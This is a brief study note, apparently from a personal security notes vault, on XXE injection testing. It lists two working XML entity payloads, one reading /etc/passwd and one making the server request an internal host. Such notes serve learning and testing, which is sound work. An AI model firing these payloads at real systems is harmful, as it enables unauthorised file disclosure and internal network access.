### Where to look

- Look in requests that contain XML

### What to try

- Try `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` with `&xxe;` to fetch a file from the file system
- Try `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>` with `&xxe;` to create a SSRF attack to reach out to other accessible servers
- 

### More Details

More details can be found at [[Cyber Security/Learning/Web Security Academy/XXE Injection|XXE Injection]]